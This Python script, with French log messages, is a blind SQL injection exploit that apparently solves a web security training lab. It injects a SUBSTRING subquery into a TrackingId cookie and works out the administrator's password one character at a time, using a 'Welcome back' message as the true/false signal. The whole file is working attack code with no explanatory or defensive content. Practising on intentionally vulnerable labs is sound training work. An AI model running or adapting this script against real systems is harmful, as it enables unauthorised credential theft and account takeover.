import string
import requests
import sys
import logging

def send_request(url, cookie):
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers)
    return response.text

def run_script(url, cookie):
    tracking_cookie = cookie
    password = ''
    logging.info('[*] Recherche du mot de passe de l\'administrateur : ')

    for depth in range(20):  
        for char in string.ascii_letters + string.digits:
            injected_cookie = f"{tracking_cookie}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {depth + 1}, 1) = '{char}"
            response = send_request(url, injected_cookie)
            if 'Welcome back' in response:
                password += char
                sys.stdout.write(char)
                sys.stdout.flush()
                break
            
    if password:
        logging.info(f'\n[*] Mot de passe trouvé : {password}')


    else:
        logging.info('Password not found')


def main():
    logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.INFO)
    target_url = 'https://0af300280371f1c8802f99e900b500e9.web-security-academy.net/filter'
    tracking_cookie = 'TrackingId=LkXoRn86MoN4bHn1'

    run_script(target_url, tracking_cookie)

if __name__ == "__main__":
    main()